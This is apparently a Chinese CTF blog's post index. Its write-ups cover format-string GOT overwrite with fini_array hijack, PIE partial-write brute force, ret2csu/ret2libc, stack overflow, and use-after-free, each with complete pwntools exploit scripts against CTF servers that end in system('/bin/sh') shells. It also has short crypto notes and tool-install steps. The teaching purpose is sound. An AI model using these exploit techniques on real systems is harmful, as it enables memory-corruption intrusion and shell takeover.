不能理论无限执行","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"格式化字符串任意写&泄露基址","slug":"格式化字符串任意写-泄露基址","date":"2022-10-12T02:25:53.000Z","updated":"2022-10-12T05:25:08.173Z","comments":true,"path":"2022/10/12/格式化字符串任意写-泄露基址/","link":"","permalink":"http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/","excerpt":"","text":"本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址 我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力 但是如果是篡改puts函数的got表呢？ 我们知道 动态链接的情况下 当我们调用一个函数时 他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用 如果我们将其got表内存储的真实地址修改为其他函数的真实地址 那么当程序调用原函数时 就相当于调用了篡改后的函数 1payload = fmtstr_payload(offset, &#123;puts_got:system_addr &#125;) 以上述payload为例 假设我们需要修改puts函数的got表 使其为system函数的地址 那么我们就可以这样构造payload(这里注意一下，fmtstr这个工具是会自己补齐字长的 这将影响到我们下文中一道例题 现在留个意就行了) ps:并且这个工具默认生成的是32位情况下 如果需要切换到64位 需要自己手动添加 1context.arch = &quot;amd64&quot; 但是一般题目除非出题人好心 不然真实地址还是得我们自己泄露的吧 那如何一并利用格式化字符串泄露函数的真实地址呢？ 还记不记得 格式化字符串最开始的漏洞利用 就是泄露栈上的内容 如果我们将got表写入栈上 那是不是也可以通过格式化字符串漏洞将其泄露出来？ 1payload = b&quot;%n$s&quot;.ljust(16,b&quot;\\x00&quot;)+p64(puts_got) 这里有几点要注意一下 一个是n 注意是地址所在的偏移 还有一点是格式化字符这里选择的是s 最后一个疑惑在于为什么要用\\x00补齐16个字节 这个我也不懂 死记就完事了(你也可以试试不补齐 然后看会泄露个啥出来) 好了 接下来用一题例题来演示一下 方便理解(例题还涉及到了fini劫持的知识点 不懂的话建议先去看另外一篇) HNCTF2022-[WEEK2]fmtstr_level2附件有给libc文件 猜测要用到泄露基址 checksec看一下进制和保护 有canary 要么泄露绕过 要么就不能栈溢出了 再看一下程序 1234567891011121314151617int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[296]; // [rsp+0h] [rbp-130h] BYREF unsigned __int64 v5; // [rsp+128h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(&quot;Welcome to the game of formatting strings&quot;); puts(&quot;Be careful, you only get one shot at this game&quot;); puts(&quot;First please tell me your game ID&quot;); read(0, buf, 0x100uLL); printf(buf); puts(&quot;Okk,try to hack it;sh&quot;); return 0;&#125; 唯一看起来有价值的就只有main函数了 没有任何的后门函数 甚至buf的字节也不够栈溢出 但是注意看 最后的puts输出的字符串有sh 那么可以猜测出题目的解法是修改got表 结果我们只有一次格式化字符串任意写的机会 好像并不能满足泄露地址后再修改got表的需求 但是如果我们将fini_array的值改为main函数 那么程序结束后 就会重新返回到main函数 那么我们就有了第二次利用格式化字符串的机会 于是解题思路可以分为两步 1.修改fini_array和泄露函数真实地址 2.将puts_got修改为system函数 那么接下来开始编写exp gdb查看了偏移以后 发现我们输入的第一个字长的数据位于偏移6的地方 第一个payload的难点在于搞清楚两个格式化字符串的偏移和payload的结构 12payload = fmtstr_payload(6, &#123;fini_addr:main_addr&#125;)payload += b&quot;%17$s&quot;.ljust(16,b&quot;\\x00&quot;)+p64(puts_got) //6+8（第一行payload字节数64）+2+1 按照我们上文所说的是不是应该这么构造payload 但是你会发现最后泄露出来的地址是 aaaaba+fini_array的地址(0x4031f0) 前面的aaaaba是什么东西？ 我们打印出fmtstr构造的数据看看 可以看到aaaaba出自这里 这里就是我们上文所说到的fmtstr的自动补齐一个字长 而后面的\\x00也是为了传送地址(但是地址只有三字节 所以需要5个\\x00才补齐一个字长) 那么说回我们刚才的错误 其原因在于我们需要将格式化字符串放在一起 地址放在一起 才能两次利用一个漏洞点 所以 正确的payload应该把aaaaba替换成泄露地址的格式化字符串 12payload = b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\\xf01@\\x00\\x00\\x00\\x00\\x00\\xf11@\\x00\\x00\\x00\\x00\\x00\\xf21@\\x00\\x00\\x00\\x00\\x00&quot;payload += p64(puts_got) 但是这里我们会发现 recv接收到的数据太多了 像ret2libc中的接收办法显然是会出错的 1puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)) 这里用到[-6:] 只接收后六个字节 那么我们此时成功进行了fini劫持 我们再输入io.recv()就会发现又接收到了main函数开始时puts的那些字符串 第二次的payload就简单至极了 最后放下完整的exp吧 123456789101112131415161718192021222324from pwn import*context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io = remote(&quot;1.14.71.254&quot;,28466)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;First please tell me your game ID&quot;)fini_addr = 0x4031F0main_addr = 0x4011b6ret_addr = 0x40101aputs_got = elf.got[&#x27;puts&#x27;]payload = b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\\xf01@\\x00\\x00\\x00\\x00\\x00\\xf11@\\x00\\x00\\x00\\x00\\x00\\xf21@\\x00\\x00\\x00\\x00\\x00&quot;payload += p64(puts_got)io.sendline(payload)io.recv()puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]hex(libc_addr)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]io.recv()io.recvuntil(&quot;First please tell me your game ID&quot;)payload = fmtstr_payload(6,&#123;puts_got:system_addr&#125;)io.sendline(payload)io.interactive()","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"密码学笔记","slug":"密码学笔记","date":"2022-10-09T15:12:10.000Z","updated":"2022-10-09T15:42:40.792Z","comments":true,"path":"2022/10/09/密码学笔记/","link":"","permalink":"http://example.com/2022/10/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"自己用的密码学笔记 不准备讲的跟pwn一样详细 MD5hash算法一类 32位数字和字母混合码 base base16：包含数字0-9，大写字母A-F base32：包含数字2-7，大写字母A-Z,特殊符号&#x3D;&#x3D;&#x3D; base64：包含数字0-9，大写字母A-Z，小写字母a-z，特殊符号+、&#x2F; 、&#x3D;&#x3D;、&#x3D;等 32和64区别 base32没有小写字母，注意base32与base64都有＝号 base32编码可以用于文件系统的名称（不区分大小写情况）。而base64编码后数据量相比原先不是增加很多，可以用于网络传输。 URL统一资源定位符 一般% ROT13编码ROT13（回转13位，rotate by 13 places，有时中间加了个连字符称作ROT-13）是一种简易的替换式密码。 只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。 摩斯密码这个没啥好说的 很容易辨识 凯撒密码根据图自己看偏移吧 Quoted-printableQuoted-printable将任何8-bit字节值可编码为3个字符：一个等号”&#x3D;”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值 rabitRabbit 是一种高速流密码，于 2003 年在 FSE 研讨会上首次提出。 Rabbit 使用一个 128 位密钥和一个 64 位初始化向量 核心组件是一个位流生成器，该流生成器每次迭代都会加密 128 个消息位。 栅栏密码所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多","categories":[{"name":"密码","slug":"密码","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81/"}],"tags":[]},{"title":"简单爆破partial write","slug":"简单爆破partial-write","date":"2022-10-06T09:23:02.000Z","updated":"2022-10-06T10:59:57.452Z","comments":true,"path":"2022/10/06/简单爆破partial-write/","link":"","permalink":"http://example.com/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/","excerpt":"","text":"原理分析本篇介绍ret2text的一种特殊情况 先前我们学习过的是没有pie的情况下 这时候我们backdoor函数的地址清清楚楚 我们可以直接栈溢出覆盖 控制程序执行流 但是如果开了pie呢？ 这样的话后门函数的地址就随机化了 我们通过ida只能得知其与基址的偏移 如上图所示 这样的情况下 我们又该如何得知backdoor函数的真实返回地址呢？ 不知道你还记不记得我们曾经讲过虚拟内存分页机制 其导致了基址的后三位一定为000 所以函数的地址后三位保持不变 不会因为pie的开启而变化 所以： 我们假设程序的基址是0xfffffffffffff000 那么函数的偏移是0x0000 其除了后四位 其他位和基址是一样的(不排除进一的情况) 而程序正常结束后的ret 其地址也是基址+偏移得到的 所以，我们在已经直到后三位的情况下 要想得知后门函数的真实地址 只需要爆破倒数第四位 就可以试出来了 真题解析 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); puts(&quot;Do you konw ret2text?&quot;); puts(&quot;It&#x27;s a easy challenge&quot;); vuln(); puts(&quot;You failed.&quot;); return 0;&#125; 1234567__int64 vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF read(0, buf, 0x140uLL); return 0LL;&#125; 1234int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125; 最简单的栈溢出到后门函数 唯一不同的是开启了pie需要爆破倒数第四位的地址 直接上exp吧 1234567891011121314151617181920from pwn import*def exploit(): io = remote(&quot;43.143.7.97&quot;,28774) io.recvuntil(&quot;It&#x27;s a easy challenge&quot;) payload = cyclic(0x100+0x8) payload += p16(0x11e2) io.send(payload) io.recv() io.sendline(&quot;cat flag&quot;) result = io.recv(timeout=1) io.interactive()if __name__ == &#x27;__main__&#x27;: try_count = 0 while(True): try: exploit() except: try_count += 1 print(&quot;failed :&#123;&#125;&quot;.format(try_count)) 这里你会发现后三位的地址有点不一样 后门函数的后三位是1DD 但是exp上写的是1e2 这里是栈对齐的问题 因为开启了pie 又没办法泄露基址 所以我们无法获得ret的汇编地址 这里看一下汇编代码 就比较好理解了 我们相当于是跳过了push rbp这一指令 因为此时的rbp已经被我们填入的垃圾数据覆盖了 如果这时候将rbp入栈 就会破坏原有的栈结构 至于为什么在没有开启pie的ret2text的题目中不用注意这一点 只能解释说这是pie特有的需要注意的情况","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"HNCTF2022.ret2csu","slug":"HNCTF2022-ret2csu","date":"2022-10-06T08:50:29.000Z","updated":"2022-10-06T09:20:23.077Z","comments":true,"path":"2022/10/06/HNCTF2022-ret2csu/","link":"","permalink":"http://example.com/2022/10/06/HNCTF2022-ret2csu/","excerpt":"","text":"看一下保护机制 再拖到ida里看一下 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0LL); setbuf(stderr, 0LL); setbuf(_bss_start, 0LL); write(1, &quot;Start Your Exploit!\\n&quot;, 0x14uLL); vuln(); return 0;&#125; 12345678ssize_t vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF write(1, &quot;Input:\\n&quot;, 7uLL); read(0, buf, 0x200uLL); return write(1, &quot;Ok.\\n&quot;, 4uLL);&#125; 主体部分非常简洁 但是没有任何后门函数和泄露真实地址的地方 一开始我们会想自己构造rop链 通过ROPgadget来寻找rdi rsi rdx三个寄存器的传参汇编地址 我们来看一下能否找到我们想要的汇编 可以看到并没有rdx 但是仍然还存在一种可能，我们gdb看一下当我们read数据的时候 rdx寄存器的值是多少 可以看到是0x4 显然没有办法成为我们调用wirte函数的参数(因为其是作为第三个参数size存在的，这样我们只能输出4个字节的数据) 所以此时我们回忆一下，有没有什么万能的rop链？欸 一想还真有 叫ret2csu(相关的介绍在栈部分里有) 123456789101112131415161718.text:0000000000401290 loc_401290: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000401290 mov rdx, r14.text:0000000000401293 mov rsi, r13.text:0000000000401296 mov edi, r12d.text:0000000000401299 call ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8].text:000000000040129D add rbx, 1.text:00000000004012A1 cmp rbp, rbx.text:00000000004012A4 jnz short loc_401290.text:00000000004012A6.text:00000000004012A6 loc_4012A6: ; CODE XREF: __libc_csu_init+35↑j.text:00000000004012A6 add rsp, 8.text:00000000004012AA pop rbx.text:00000000004012AB pop rbp.text:00000000004012AC pop r12.text:00000000004012AE pop r13.text:00000000004012B0 pop r14.text:00000000004012B2 pop r15.text:00000000004012B4 retn 我们再看一下程序给了我们哪些函数 那么思路直接有了 这里用write函数 然后通过csu汇编代码将参数传给寄存器 这样我们就能泄露出write函数的真实地址了(也可以是其他的) 泄露出来以后 就是ret2libc的知识点了 思路捋清了 直接看exp吧 123456789101112131415161718192021222324from pwn import*io = remote(&quot;43.143.7.97&quot;,28657)libc = ELF(&quot;libc.so.6&quot;)elf = ELF(&quot;./ret2csu&quot;)gadget2_addr = 0x4012A6gadget1_addr = 0x401290vuln_addr = 0x401176rdi_addr = 0x4012b3write_got = elf.got[&#x27;write&#x27;]io.recvuntil(&quot;Input:&quot;)payload1 = cyclic(0x100+0x8)+p64(gadget2_addr)+cyclic(8)+p64(0)+p64(1)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(gadget1_addr)+cyclic(56)+p64(vuln_addr)io.sendline(payload1)io.recvuntil(&quot;Ok.\\n&quot;)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]hex(libc_addr)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]hex(system_addr)binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))hex(binsh_addr)io.recvuntil(&quot;Input:\\n&quot;)payload2 = cyclic(0x108)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)io.sendline(payload2)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"栈溢出-特殊情况","slug":"栈溢出-特殊情况","date":"2022-10-03T03:25:33.000Z","updated":"2022-10-03T03:51:33.188Z","comments":true,"path":"2022/10/03/栈溢出-特殊情况/","link":"","permalink":"http://example.com/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/","excerpt":"","text":"本篇博客用来记录一种特殊的情况 直接上例题吧 看完就知道什么意思了 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4[56]; // [esp+4h] [ebp-38h] BYREF printf(&quot;Qual a palavrinha magica? &quot;, v4[0]); gets(v4); return 0;&#125; 12345678910111213141516171819202122232425void __cdecl get_flag(int a1, int a2)&#123; int v2; // esi unsigned __int8 v3; // al int v4; // ecx unsigned __int8 v5; // al if ( a1 == 814536271 &amp;&amp; a2 == 425138641 ) &#123; v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;); v3 = getc(v2); if ( v3 != 255 ) &#123; v4 = (char)v3; do &#123; putchar(v4); v5 = getc(v2); v4 = (char)v5; &#125; while ( v5 != 255 ); &#125; fclose(v2); &#125;&#125; 总体的思路应该就是最简单的栈溢出控制程序执行流到getflag这个函数 但是getflag在open flag.txt前有一个if判定 我们要先使a1 a2的值符合这个条件 才能使函数正常运行 但是这个a1 a2我们发现也没有办法通过栈溢出的方法来覆盖使其变成符合条件的值 所以这里只能在调用getflag函数时 一并传入a1 a2的值 exp如下： 1234567from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29661)getflag_addr = 0x80489a0exit_addr = 0x804e6a0payload = cyclic(0x38)+p32(getflag_addr)+p32(exit_addr)+p32(0x308CD64F)+p32(0x195719D1)io.sendline(payload)io.interactive() 这里你会发现 按照平常我们填充的垃圾数据应该是 变量到ebp的距离0x38+0x4来覆盖ebp 这里为什么我们没有多一个字长的垃圾数据呢？ 来看一下main函数的汇编情况 是不是缺少了什么？ 如果你对栈帧的概念不是很清楚 可能看不出什么 我们再放一段正常的函数汇编代码 如果你熟悉栈帧的概念(这个我们在ret2csu里有讲到) 你就会知道大部分栈帧在生成的时候都会有这两段汇编代码 用来使esp和ebp入栈 但是这道题的getflag函数并没有ebp 他利用esp寻址的办法 所以此时我们的变量距离ret addr只有0x38字节 而非0x38+4 再说回为什么函数和参数之间的垃圾数据要为exit函数的地址 这是因为程序如果是以异常状况结束的 那么他将不会有回显 也就是说open(flag)得到的flag并不会显示出来","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"溢出覆盖变量","slug":"溢出覆盖变量","date":"2022-10-02T16:55:35.000Z","updated":"2022-10-03T03:57:15.380Z","comments":true,"path":"2022/10/03/溢出覆盖变量/","link":"","permalink":"http://example.com/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/","excerpt":"","text":"其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧 我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数据 通常我们都是用一些没有意义的垃圾数据去覆盖他 但是有些题目 就可能会故意刁难我们 比如下面这题 是吧 他都把var[13]赋值为了0 结果要var[13]&gt;0并且&#x3D;17才能达到我们系统调用的目的 这怎么整？ 我们唯一的输入点就在第十行 其中肯定有漏洞 %s 读入字符串数据 注意这里的是%s 我们刚开始提到的干货就是这个 ps:这里我也理解不了 感兴趣的可以自己看大佬博客： pwn中str()与p64() - ATKevin - 博客园 (cnblogs.com) 不然就是记个结论 %s就得用p32&#x2F;p64 传输数据 也就是说我们在覆盖var[13]时 需要注意不能用b””或者是str() 说回题目 scanf没有对输入的字节长度进行限制 存在了栈溢出漏洞 我们只需要用垃圾数据填充var数组的前13个数据 然后用17填充var[13] 当然 这里还得注意一下 char类型的数组的每个值都是一个字节长度的 而这题并不是char类型的数组 所以我们应该用一个字长去覆盖一个数组元素 所以这里我们的payload应该写成 1payload = cyclic(13*4)+p32(17) 当然也可以写成 1payload = p32(1)*13+p32(17) 这样我们就成功覆盖了var[13]的值为17了","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"UAF","slug":"UAF","date":"2022-10-01T13:10:23.000Z","updated":"2022-10-01T13:51:40.139Z","comments":true,"path":"2022/10/01/UAF/","link":"","permalink":"http://example.com/2022/10/01/UAF/","excerpt":"","text":"TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了 UAF原理先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧 就是当我们把一个chunk释放之后 再利用他 怎么做到这一点？ 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;cstdlib&gt;#include &lt;string.h&gt;int main()&#123; char *p1; p1 = (char *) malloc(sizeof(char)*10);//申请内存空间 memcpy(p1,&quot;hello&quot;,10); printf(&quot;p1 addr:%x,%s\\n&quot;,p1,p1); free(p1);//释放内存空间 char *p2; p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存 memcpy(p1,&quot;world&quot;,10);//对内存进行修改 printf(&quot;p2 addr:%x,%s\\n&quot;,p2,p1);//验证 return 0;&#125; 放一段代码 应该很好看懂吧 先申请一个chunk 然后打印出指向这个chunk的指针的值 再释放这个chunk 接着再申请一个 最后再打印出新申请的chunk的指针的值 我们会发现这二者都是一样的值 说明什么？ 如果只是单纯的free chunk的话 没有去清空指向被free的这个chunk的指针 那么这个指针仍然可以指向这个free chunk 概念介绍到这边 应该就可以大部分理解了 如果你需要更加详细的介绍 可以看下面这篇文章 (3条消息) UAF (Use After Free)漏洞分析及利用_4ct10n的博客-CSDN博客_uaf 真题复现1说真的 光uaf的题型就有好多种出法 想了想 还是拿nisa 21届校赛的题来当第一道例题 这道题的引导性个人认为十分不错 同时讲解起来也方便理解 checksec看一下保护机制和位数 发现是32位的 那么接下来的一些数据就得注意了 拖到ida里面看看main函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3[4]; // [esp+8h] [ebp-10h] BYREF v3[1] = __readgsdword(0x14u); setbuf(stdin, 0); setbuf(stdout, 0); while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;1.create&quot;); puts(&quot;2.edit&quot;); puts(&quot;3.delete&quot;); puts(&quot;4.show&quot;); putchar(58); __isoc99_scanf(&quot;%d&quot;, v3); if ( v3[0] != 2 ) break; edit(); &#125; if ( v3[0] &gt; 2 ) &#123; if ( v3[0] == 3 ) &#123; del(); &#125; else if ( v3[0] == 4 ) &#123; show(); &#125; else &#123;LABEL_13: puts(&quot;Invalid choice&quot;); &#125; &#125; else &#123; if ( v3[0] != 1 ) goto LABEL_13; create(); &#125; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940int create()&#123; int result; // eax int v1; // ebx char *v2; // eax printf(&quot;you are creating the %d page\\n&quot;, i); result = i; if ( i &gt;= 0 ) &#123; result = i; if ( i &lt;= 9 ) &#123; v1 = i; (&amp;page)[v1] = malloc(8u); if ( i ) &#123; if ( i &lt;= 0 || i &gt; 9 ) &#123; result = puts(&quot;NO PAGE&quot;); &#125; else &#123; puts(&quot;Good cretation!&quot;); result = ++i; &#125; &#125; else &#123; v2 = page; *page = 1868654951; v2[4] = 0; *(page + 1) = echo; puts(&quot;The init page&quot;); result = ++i; &#125; &#125; &#125; return result;&#125; 12345678910111213141516171819unsigned int edit()&#123; int v1; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); puts(&quot;Input page&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 0 || v1 &gt; i ) &#123; puts(&quot;NO PAGE&quot;); &#125; else &#123; puts(&quot;Input your strings&quot;); __isoc99_scanf(&quot;%s&quot;, (&amp;page)[v1]); &#125; return __readgsdword(0x14u) ^ v2;&#125; 1234567891011121314unsigned int del()&#123; int v1; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); puts(&quot;Input page&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt; 0 || v1 &gt; i ) puts(&quot;NO PAGE&quot;); else free((&amp;page)[v1]); return __readgsdword(0x14u) ^ v2;&#125; 123456789101112131415161718192021unsigned int show()&#123; int v1; // [esp+8h] [ebp-10h] BYREF unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); puts(&quot;Input page&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 ) &#123; if ( v1 &lt;= 0 || v1 &gt; i ) puts(&quot;NO PAGE&quot;); else echo((&amp;page)[v1]); &#125; else &#123; (*(page + 1))(page); &#125; return __readgsdword(0x14u) ^ v2;&#125; 看蒙蔽了是不是 没关系 接下来 我们将花费足够的时间以及耐心来为你分析透彻这些代码 目光聚集到main函数 堆的经典菜单题 看懂不成问题吧 输入对应的数字跳转进对应的函数 按照顺序我们先看create函数 第一遍我们先粗略的遍历一遍这个函数的作用 有一点小不同 其他题目可能还需要我们输入index来创建一个chunk 但是这题是用++i的办法来自己设置index 可以看到创建的chunk大小固定为0x8 接着看第二个箭头指向的代码 *()就是指这个地址的内容 假设哈 假设page &#x3D; 0x1000 你可能以为page+1的结果会是0x1001 其实不是 这里的1是指一个字长 也就是说结果其实是0x1004 那么这段代码的意思也就是说 page地址的下一个字长的内容更改为echo这个函数 然后我们点进去看一下这个函数是干什么的 1234int __cdecl echo(char *s)&#123; return puts(s);&#125; puts 有点东西是不是 不过我们先放着 再看一下edit函数 这个函数内容不用说看名字也懂干什么的吧 就是输入你要编辑的index数 然后再输入要更改的内容 这里用到了scanf 这个函数没有限制输入字长 我们栈溢出的常客是不是 所以这里也能来个溢出？ 对了 有这个想法 这题你能看到曙光了 我们再回想一下 上一个函数create 指针所指向的下一个字长处是不是一个echo函数 欸 是吧 替换addr来控制程序执行流我们再熟悉不过了 不过先别激动 还有一个函数没看呢(delete我也解释不来 你就知道他free了chunk但是没有清空指针的内容就行了) 看到那个if判定了吗 如果我们只设置一个chunk 那么我们想要show这个chunk还不行 因为index不能为0 所以我说这道题的引导性其实是很好的 他驱使你去进行uaf 所以我们的思路是什么 先创建一个page0的chunk 然后把他free了 接着创建一个page1的chunk 由于page0被释放后会被存入fast bin 此时申请的page1大小小于等于page0 所以page0就被重新分配给了page1 他们两个共享一个空间 指针指向的地址相同 这里就利用了uaf 那么我们之前看到的edit函数又该如何利用呢？再接着看show函数图上的第二个箭头 这句代码的作用是什么？ 先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数 看到这里你就能懂了吧 所以当我们不对chunk内容进行任何溢出时 当我们仅仅只是输入小于一个字长的数据时 show函数就相当于调用了echo函数把chunk的内容puts了出来 所以此时我们的思路就立马清晰了 我们用edit函数修改chunk的内容为 “sh\\x00\\x00” 然后溢出到下一个字长 修改其内容为system的地址 这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数 因此我们成功实现了系统调用 这里再解释一下为什么是 sh\\x00\\x00 因为是32位的程序嘛 一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够 所以使用sh也能达成对应的操作 至于后面的两个\\x00 显然是为了填充字节 又不至于破坏sh字符串 所以最后我们的exp是： 123456789101112131415161718192021222324252627282930313233343536from pwn import*io = remote(&quot;1.14.71.254&quot;,28340)def add(): io.recvuntil(&quot;:&quot;) io.sendline(&quot;1&quot;)def edit(id,content): io.recvuntil(&quot;:&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;Input page\\n&quot;) io.sendline(str(id)) io.recvuntil(&quot;Input your strings\\n&quot;) io.sendline(content)def delete(id): io.recvuntil(&quot;:&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;Input page\\n&quot;) io.sendline(str(id))def show(id): io.recvuntil(&quot;:&quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;Input page\\n&quot;) io.sendline(str(id))io.recvuntil(&quot;4.show&quot;)add()delete(0)add()payload = b&quot;sh\\x00\\x00&quot;len(payload)payload +=p32(0x8048642)edit(1,payload)show(0)io.interactive() ps:从堆开始 我们将会频繁使用python中的def 因为菜单题的重复接收输送实在是太多了 如果看不懂这样书写的语法 可以自行百度学习","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"pwn需要的一些工具安装","slug":"pwn需要的一些工具安装","date":"2022-09-30T04:09:03.000Z","updated":"2022-10-03T02:35:55.304Z","comments":true,"path":"2022/09/30/pwn需要的一些工具安装/","link":"","permalink":"http://example.com/2022/09/30/pwn%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/","excerpt":"","text":"这篇文章用来记录搭建pwn手需要的环境 要下载什么工具以及如何下载 其他方向的可以当个参考 vimVim是一个类似于Vi的著名的功能强大、高度可定制的文本编辑器 1sudo apt install vim 输入该行指令安装 安装完成后 在终端输入vim 查看是否安装成功 如果成功 会显示以下内容 具体的使用方法这里就不教了 gitGit是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理 后面会经常使用github 所以这个必装 1sudo apt install git 安装后输入 查看是否安装成功 1git --version 成功了以后会像下图所示 gcc必装 没啥好解释的 自己编写程序放到gdb中印证猜想必备 1sudo apt install gcc 这个安装的比较久 下好了以后输入验证一下 1gcc -v python3这个也是必备的 做题没有这个怎么做 这里不下2是因为2已经停止维护了 虽然3的数据类型更加严格 但是总归可以适配 1sudo apt install python3-pip 输入验证是否安装成功 1pip -v 这里还有一条可以偷懒的指令 我们调用python3不是还要多打一个3 这一个插件可以默认打python即为python3 1sudo apt install python-is-python3 可以直接输入python看可以不可以 qemups:接下来的图片可能会突然大变，因为这中途我美化了一下虚拟机 所以终端颜色变了 看不习惯见谅 解释不来 没用会 抄一段百度wiki 而且这个下起来巨久 我的建议是先放一放 最后安 QEMU是一套由法布里斯·贝拉(Fabrice Bellard)所编写的以GPL许可证分发源码的模拟处理器软件，在GNU&#x2F;Linux平台上使用广泛。Bochs，PearPC等与其类似，但不具备其许多特性，比如高速度及跨平台的特性，通过KQEMU这个闭源的加速器，QEMU能模拟至接近真实电脑的速度 1sudo apt-get install qemu-user qemu-system 1qemu- //检测安装是否成功 输完按两下tap键 gdb-multiarch用作gdb客户端进行调试，是任何架构的通用客户端 1sudo apt-get install gdb-multiarch 输入检测是否安装成功 1gdb-multiarch -v PWN工具 这里我们为了方便存放所有的工具 所以在主目录里面创建一个新的文件夹tools(自己爱怎么命名怎么来) 你是不是觉得你都要成为一名黑客了 怎么还用怎么土气的办法创建文件夹？来 用下面的指令也行 12cd ~mkdir tools 注意注意！！！！接下来pwntools工具的安装 终端注意是在tools文件夹里面启动(部分不需要)！！！ 我下面的图显示的是不在对应文件夹里面安装的！！别学错了 下面所有的下载过程有可能会报错，目前找不到什么原因，哪步报错，重新执行哪步就好了 